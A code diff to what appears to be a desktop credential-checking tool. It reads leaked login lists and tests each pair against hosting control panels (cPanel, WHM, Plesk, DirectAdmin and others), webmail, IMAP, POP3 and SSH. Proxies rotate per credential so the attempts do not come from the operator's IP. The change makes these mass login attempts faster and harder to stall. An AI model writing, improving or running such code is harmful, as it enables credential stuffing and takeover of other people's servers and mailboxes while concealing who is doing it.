@@ -9,6 +9,15 @@ import { resolveTxt, resolve4, resolveMx, resolveSrv } from 'node:dns/promises';
 import { runBatch } from '../core/tester.js';
 import { streamCredentialsFromFile, dedupeFileToDisk, parsedCredsPathFor } from '../core/parse-file.js';
 import { createResultSink, exportRun, readRunProgress, readResults } from '../core/result-store.js';
+import { createProgressBatcher } from '../core/progress-batcher.js';
+import { settleWithBudget } from '../core/settle-with-budget.js';
+import { shouldRunPanelChecks } from '../core/panel-gate.js';
+
+// Hard ceiling for a single credential's panel fan-out. Above any individual
+// probe's timeout (5s) so normal detection is unaffected; it only caps the
+// pathological case where a probe never honors its own timeout (a dead proxy
+// that never resets) and would otherwise hang the worker forever.
+const PANEL_BUDGET_MS = 9000;
 import { resultFolderFiles, verifiedFolderFiles } from '../core/export.js';
 import { makeGeoResolver, loadCountryLookup } from '../core/geoip.js';
 import { grabBanner } from '../core/banner.js';
@@ -587,6 +596,12 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
   const sink = resume
     ? createResultSink(runFilePath(), { append: true, initialTotal: prior.total, initialCounts: prior.counts })
     : createResultSink(runFilePath());
+  // Coalesce per-credential progress into batched IPC sends. One message per
+  // credential floods the renderer (and this process) at large scale; a batched
+  // array keeps the message rate bounded while delivering every result.
+  const progress = createProgressBatcher({
+    flush: (items) => mainWindow?.webContents.send('batch:progress', items),
+  });
   const effSource = resume ? skipKnown(source, prior.keys) : source;
   // Pool rotation happens per credential via proxyProvider; manual proxy is the fallback.
   const hasPool = proxyPool.size().valid > 0;
@@ -611,7 +626,7 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
       async (result, index) => {
         if (currentAbort?.signal.aborted) return;
         try {
-          if (opts.protocols === 'all' || opts.protocols === 'panels') {
+          if ((opts.protocols === 'all' || opts.protocols === 'panels') && shouldRunPanelChecks(result)) {
             const _uParts = (result.cred.user || '').split('@');
             const host = _uParts[1];
             const bareUser = _uParts[0];
@@ -623,19 +638,22 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
               // fresh SOCKS proxy per credential) so they don't hit panels from
               // the operator's IP. Falls back to the manual proxy, then direct.
               const panelProxy = (hasPool && proxyPool.getNext()) || proxyUrlFrom(opts.proxyConfig) || undefined;
-              const [cp, wm, whm, ssh, imapR, pop3R, pleskR, daR, cyber, webmin, hestia] = await Promise.all([
-                safe(() => runCpanelChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2083, 2082, 8443], proxy: panelProxy }).then(r => r[0]), 'cpanel'),
-                safe(() => runWebmailChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [443, 2096, 2095], proxy: panelProxy }).then(r => r[0]), 'webmail'),
-                safe(() => runWhmChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2087, 2086, 8443], proxy: panelProxy }).then(r => r[0]), 'whm'),
-                safe(() => runSSHChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [22, 2222, 2022] }).then(r => r[0]), 'ssh'),
-                safe(() => verifyImap({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'imap'),
-                safe(() => verifyPop3({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'pop3'),
-                safe(() => verifyPlesk({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'plesk'),
-                safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'directadmin'),
-                safe(() => verifyCyberPanel({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'cyberpanel'),
-                safe(() => verifyWebmin({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'webmin'),
-                safe(() => verifyHestia({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'hestia')
-              ]);
+              // Budget the whole fan-out: a probe that ignores its own timeout
+              // must not hang the worker. Unfinished probes come back as a
+              // timeout marker so the credential's result is still delivered.
+              const [cp, wm, whm, ssh, imapR, pop3R, pleskR, daR, cyber, webmin, hestia] = await settleWithBudget([
+                { label: 'cpanel', run: () => safe(() => runCpanelChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2083, 2082, 8443], proxy: panelProxy }).then(r => r[0]), 'cpanel') },
+                { label: 'webmail', run: () => safe(() => runWebmailChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [443, 2096, 2095], proxy: panelProxy }).then(r => r[0]), 'webmail') },
+                { label: 'whm', run: () => safe(() => runWhmChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [2087, 2086, 8443], proxy: panelProxy }).then(r => r[0]), 'whm') },
+                { label: 'ssh', run: () => safe(() => runSSHChecks([{ host, user: bareUser, pass: result.cred.pass }], { timeout: 4000, concurrency: 1, ports: [22, 2222, 2022] }).then(r => r[0]), 'ssh') },
+                { label: 'imap', run: () => safe(() => verifyImap({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'imap') },
+                { label: 'pop3', run: () => safe(() => verifyPop3({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000 }), 'pop3') },
+                { label: 'plesk', run: () => safe(() => verifyPlesk({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'plesk') },
+                { label: 'directadmin', run: () => safe(() => verifyDirectAdmin({ host, user: result.cred.user, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'directadmin') },
+                { label: 'cyberpanel', run: () => safe(() => verifyCyberPanel({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'cyberpanel') },
+                { label: 'webmin', run: () => safe(() => verifyWebmin({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'webmin') },
+                { label: 'hestia', run: () => safe(() => verifyHestia({ host, user: bareUser, pass: result.cred.pass }, { timeout: 5000, proxy: panelProxy }), 'hestia') },
+              ], PANEL_BUDGET_MS);
               if (currentAbort?.signal.aborted) return;
               result.panels = { cpanel: cp, webmail: wm, whm, ssh, imap: imapR, pop3: pop3R, plesk: pleskR, directadmin: daR, cyberpanel: cyber, webmin, hestia };
             }
@@ -644,7 +662,7 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
           result.panelError = panelErr.message || String(panelErr);
         }
         sink.write(result);
-        mainWindow?.webContents.send('batch:progress', { result, index });
+        progress.push({ result, index });
       },
     );
     const summary = await sink.close();
@@ -664,6 +682,7 @@ async function runBatchToDisk(source, seeds, opts, { resume = false } = {}) {
     // Always clear the abort handle and signal completion, even if the batch
     // throws, so the renderer never gets stuck in the "running" state.
     currentAbort = null;
+    progress.flush();
     mainWindow?.webContents.send('batch:done', { done: true });
   }
 }
